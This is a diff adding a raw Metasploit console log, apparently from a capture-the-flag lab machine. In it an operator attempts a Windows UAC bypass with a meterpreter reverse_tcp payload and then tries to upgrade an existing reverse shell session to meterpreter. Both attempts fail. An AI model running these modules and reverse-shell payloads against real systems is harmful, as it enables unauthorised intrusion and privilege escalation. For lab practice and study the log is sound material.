@@ -1,0 +1,79 @@
+sf5 > use exploit/windows/local/bypassuac
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/bypassuac) > options
+
+Module options (exploit/windows/local/bypassuac):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   SESSION                     yes       The session to run this module on.
+   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf5 exploit(windows/local/bypassuac) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type             Information                                                                       Connection
+  --  ----  ----             -----------                                                                       ----------
+  1         shell sparc/bsd  Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.14.10:4545 -> 10.10.10.5:49178 (10.10.10.5)
+
+msf5 exploit(windows/local/bypassuac) > set session 1
+session => 1
+msf5 exploit(windows/local/bypassuac) > set lhost 10.10.14.10
+lhost => 10.10.14.10
+msf5 exploit(windows/local/bypassuac) > exploit
+
+[!] SESSION may not be compatible with this module.
+[*] Started reverse TCP handler on 10.10.14.10:4444 
+[-] Exploit aborted due to failure: none: Already in elevated state
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/local/bypassuac) > 
+msf5 exploit(windows/local/bypassuac) > back
+msf5 > use post/multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) > show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type             Information                                                                       Connection
+  --  ----  ----             -----------                                                                       ----------
+  1         shell sparc/bsd  Spawn Shell... Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Micros...  10.10.14.10:4545 -> 10.10.10.5:49178 (10.10.10.5)
+
+msf5 post(multi/manage/shell_to_meterpreter) > set session 1
+session => 1
+msf5 post(multi/manage/shell_to_meterpreter) > set lhost 10.10.14.10
+lhost => 10.10.14.10
+msf5 post(multi/manage/shell_to_meterpreter) > run
+
+[*] Upgrading session ID: 1
+[-] Shells on the target platform, bsd, cannot be upgraded to Meterpreter at this time.
+[*] Post module execution completed
